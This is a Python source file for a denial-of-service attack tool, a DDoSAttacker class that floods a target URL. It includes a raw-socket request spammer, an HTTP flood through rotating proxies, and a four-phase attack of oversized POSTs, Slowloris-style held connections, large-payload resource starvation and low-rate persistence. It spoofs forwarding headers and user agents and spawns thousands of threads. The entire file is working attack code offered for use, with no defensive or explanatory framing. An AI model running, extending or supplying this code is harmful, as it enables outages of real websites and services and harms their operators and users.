#!/usr/bin/env python3
"""
DDoS Attack Handler
Main attack coordination
"""

import time
import random
import threading
import socket
import ssl
from urllib.parse import urlparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class DDoSAttacker:
    def __init__(self, target_url, attack_type, thread_count=1000, instant_mode=False, proxy_manager=None):
        self.target_url = target_url
        self.attack_type = attack_type
        self.thread_count = min(thread_count, 99999)
        self.instant_mode = instant_mode
        self.proxy_manager = proxy_manager
        self.running = False
        self.stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'connections': 0,
            'start_time': time.time(),
            'duration': 0
        }
        self.stats_lock = threading.Lock()
        self.threads = []
        
        # Parse URL
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.is_https = self.parsed_url.scheme == 'https'
        
        # Load user agents
        self.user_agents = self.load_user_agents()
    
    def load_user_agents(self):
        """Load user agents from file or default list"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0'
        ]
        
        # Try to load from file
        try:
            with open('data/useragents.txt', 'r') as f:
                file_agents = [line.strip() for line in f if line.strip()]
                if file_agents:
                    user_agents.extend(file_agents)
        except:
            pass
        
        return list(set(user_agents))
    
    def execute(self):
        """Execute the attack"""
        self.running = True
        
        if self.attack_type == 'REQUEST_SPAMMER':
            self.execute_request_spammer()
        elif self.attack_type == 'HTTP_FLOOD':
            self.execute_http_flood()
        elif self.attack_type == 'MULTIFACTOR_PROXY':
            self.execute_multifactor_proxy()
        
        self.stats['duration'] = time.time() - self.stats['start_time']
    
    def execute_request_spammer(self):
        """Execute request spammer attack"""
        print("[*] Starting Request Spammer attack...")
        
        # Calculate parameters
        requests_per_thread = 1000 if self.instant_mode else 500
        delay_range = (0.001, 0.01) if self.instant_mode else (0.01, 0.1)
        
        def spam_worker(worker_id):
            for i in range(requests_per_thread):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    
                    # SSL for HTTPS
                    if self.is_https:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.host)
                    
                    # Connect
                    sock.connect((self.host, self.port))
                    
                    # Create malformed request
                    path = f"/{random.randint(1000, 9999)}?id={random.randint(1, 99999)}"
                    request = f"GET {path} HTTP/1.1\r\n"
                    request += f"Host: {self.host}\r\n"
                    request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    request += "Accept: */*\r\n"
                    request += "Connection: keep-alive\r\n"
                    request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    request += "\r\n"
                    
                    # Send request
                    sock.send(request.encode())
                    
                    # Update stats
                    with self.stats_lock:
                        self.stats['total_requests'] += 1
                        self.stats['successful'] += 1
                        self.stats['connections'] += 1
                    
                    # Close quickly
                    sock.close()
                    
                    # Random delay
                    time.sleep(random.uniform(*delay_range))
                    
                except Exception:
                    with self.stats_lock:
                        self.stats['total_requests'] += 1
                        self.stats['failed'] += 1
        
        # Start threads
        self.start_threads(spam_worker, self.thread_count)
        
        # Run for duration
        duration = 30 if self.instant_mode else 60
        time.sleep(duration)
        
        self.stop()
    
    def execute_http_flood(self):
        """Execute HTTP flood attack with proxy rotation"""
        print("[*] Starting HTTP Flood attack...")
        
        # Get proxies
        proxies = []
        if self.proxy_manager:
            proxies = self.proxy_manager.get_proxies(50)
        
        # Calculate parameters
        requests_per_thread = 800 if self.instant_mode else 300
        delay_range = (0.001, 0.005) if self.instant_mode else (0.05, 0.1)
        
        def http_worker(worker_id):
            session = requests.Session()
            session.verify = False
            
            # Configure session
            retry = Retry(total=2, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
            adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            # Use proxy if available
            proxy = None
            if proxies:
                proxy_addr = random.choice(proxies)
                proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
            
            for i in range(requests_per_thread):
                if not self.running:
                    break
                
                try:
                    # Generate headers
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'max-age=0',
                        'DNT': '1'
                    }
                    
                    # Add random headers
                    if random.random() > 0.7:
                        headers['Referer'] = f'https://{random.choice(["google.com", "facebook.com", "twitter.com"])}'
                    
                    if random.random() > 0.8:
                        headers['X-Requested-With'] = 'XMLHttpRequest'
                    
                    # Send request
                    response = session.get(
                        self.target_url,
                        headers=headers,
                        proxies=proxy,
                        timeout=3
                    )
                    
                    # Update stats
                    with self.stats_lock:
                        self.stats['total_requests'] += 1
                        if response.status_code < 400:
                            self.stats['successful'] += 1
                        else:
                            self.stats['failed'] += 1
                    
                    # Rotate proxy occasionally
                    if i % 10 == 0 and proxies:
                        proxy_addr = random.choice(proxies)
                        proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
                    
                    # Delay
                    time.sleep(random.uniform(*delay_range))
                    
                except Exception:
                    with self.stats_lock:
                        self.stats['total_requests'] += 1
                        self.stats['failed'] += 1
        
        # Start threads
        thread_count = min(self.thread_count, 500)  # Max 500 for HTTP flood
        self.start_threads(http_worker, thread_count)
        
        # Run for duration
        duration = 40 if self.instant_mode else 80
        time.sleep(duration)
        
        self.stop()
    
    def execute_multifactor_proxy(self):
        """Execute multifactor proxy attack"""
        print("[*] Starting Multifactor Proxy attack...")
        
        # Get proxies
        proxies = []
        if self.proxy_manager:
            proxies = self.proxy_manager.get_proxies(100)
        
        # Phase 1: Initial barrage
        self.execute_phase1(proxies)
        
        if self.running:
            # Phase 2: Connection exhaustion
            self.execute_phase2(proxies)
        
        if self.running:
            # Phase 3: Resource starvation
            self.execute_phase3(proxies)
        
        if self.running:
            # Phase 4: Silent persistence
            self.execute_phase4(proxies)
        
        self.stop()
    
    def execute_phase1(self, proxies):
        """Phase 1: Initial barrage"""
        print("[*] Phase 1: Initial barrage...")
        
        def phase1_worker(worker_id):
            for i in range(200):
                if not self.running:
                    break
                
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    
                    if self.is_https:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.host)
                    
                    sock.connect((self.host, self.port))
                    
                    # Send large malformed request
                    request = f"POST /login HTTP/1.1\r\n"
                    request += f"Host: {self.host}\r\n"
                    request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    request += "Content-Type: application/x-www-form-urlencoded\r\n"
                    request += f"Content-Length: {random.randint(5000, 20000)}\r\n"
                    request += "\r\n"
                    request += "A" * random.randint(1000, 5000)
                    
                    sock.send(request.encode())
                    sock.close()
                    
                    with self.stats_lock:
                        self.stats['total_requests'] += 1
                        self.stats['successful'] += 1
                    
                    time.sleep(random.uniform(0.001, 0.01))
                    
                except Exception:
                    with self.stats_lock:
                        self.stats['total_requests'] += 1
                        self.stats['failed'] += 1
        
        self.start_threads(phase1_worker, self.thread_count // 2)
        time.sleep(20 if self.instant_mode else 30)
    
    def execute_phase2(self, proxies):
        """Phase 2: Connection exhaustion"""
        print("[*] Phase 2: Connection exhaustion...")
        
        def phase2_worker(worker_id):
            sockets = []
            try:
                # Create multiple connections
                for i in range(10):
                    if not self.running:
                        break
                    
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        
                        if self.is_https:
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            sock = context.wrap_socket(sock, server_hostname=self.host)
                        
                        sock.connect((self.host, self.port))
                        
                        # Send partial request
                        sock.send(f"GET /{random.randint(1000, 9999)} HTTP/1.1\r\n".encode())
                        sock.send(f"Host: {self.host}\r\n".encode())
                        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                        sock.send("Content-Length: 1000000\r\n".encode())
                        sock.send("\r\n".encode())
                        
                        sockets.append(sock)
                        
                        with self.stats_lock:
                            self.stats['connections'] += 1
                        
                    except Exception:
                        continue
                
                # Hold connections
                start_time = time.time()
                while self.running and (time.time() - start_time) < 30:
                    for sock in sockets:
                        try:
                            sock.send(b"X-Header: keepalive\r\n")
                        except:
                            pass
                    time.sleep(10)
                
            finally:
                # Cleanup
                for sock in sockets:
                    try:
                        sock.close()
                    except:
                        pass
        
        self.start_threads(phase2_worker, self.thread_count // 4)
        time.sleep(25 if self.instant_mode else 40)
    
    def execute_phase3(self, proxies):
        """Phase 3: Resource starvation"""
        print("[*] Phase 3: Resource starvation...")
        
        def phase3_worker(worker_id):
            session = requests.Session()
            session.verify = False
            
            # Use proxy if available
            proxy = None
            if proxies:
                proxy_addr = random.choice(proxies)
                proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
            
            for i in range(100):
                if not self.running:
                    break
                
                try:
                    # Send large POST request
                    data_size = random.randint(10000, 50000)
                    data = {'payload': 'A' * data_size}
                    
                    response = session.post(
                        self.target_url,
                        data=data,
                        proxies=proxy,
                        timeout=5,
                        headers={'User-Agent': random.choice(self.user_agents)}
                    )
                    
                    with self.stats_lock:
                        self.stats['total_requests'] += 1
                        if response.status_code < 400:
                            self.stats['successful'] += 1
                        else:
                            self.stats['failed'] += 1
                    
                    # Rotate proxy
                    if proxies and i % 5 == 0:
                        proxy_addr = random.choice(proxies)
                        proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
                    
                    time.sleep(random.uniform(0.1, 0.3))
                    
                except Exception:
                    with self.stats_lock:
                        self.stats['total_requests'] += 1
                        self.stats['failed'] += 1
        
        self.start_threads(phase3_worker, self.thread_count // 3)
        time.sleep(15 if self.instant_mode else 25)
    
    def execute_phase4(self, proxies):
        """Phase 4: Silent persistence"""
        print("[*] Phase 4: Silent persistence...")
        
        def phase4_worker(worker_id):
            session = requests.Session()
            session.verify = False
            
            # Use proxy if available
            proxy = None
            if proxies:
                proxy_addr = random.choice(proxies)
                proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
            
            delay = random.uniform(5, 10) if self.instant_mode else random.uniform(15, 30)
            
            while self.running:
                try:
                    response = session.get(
                        self.target_url,
                        proxies=proxy,
                        timeout=10,
                        headers={'User-Agent': random.choice(self.user_agents)}
                    )
                    
                    with self.stats_lock:
                        self.stats['total_requests'] += 1
                        if response.status_code < 400:
                            self.stats['successful'] += 1
                        else:
                            self.stats['failed'] += 1
                    
                    # Rotate proxy occasionally
                    if proxies and random.random() > 0.7:
                        proxy_addr = random.choice(proxies)
                        proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
                    
                    time.sleep(delay)
                    
                except Exception:
                    with self.stats_lock:
                        self.stats['total_requests'] += 1
                        self.stats['failed'] += 1
                    time.sleep(delay * 2)
        
        self.start_threads(phase4_worker, min(self.thread_count, 100))
        time.sleep(30 if self.instant_mode else 60)
    
    def start_threads(self, target_func, count):
        """Start threads for attack"""
        for i in range(count):
            if not self.running:
                break
            
            thread = threading.Thread(target=target_func, args=(i,), daemon=True)
            self.threads.append(thread)
            thread.start()
            
            # Stagger creation
            if i % 100 == 0:
                time.sleep(0.01)
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        
        # Wait for threads
        for thread in self.threads:
            thread.join(timeout=2)

        self.threads.clear()

        print("[*] Attack stopped")
 
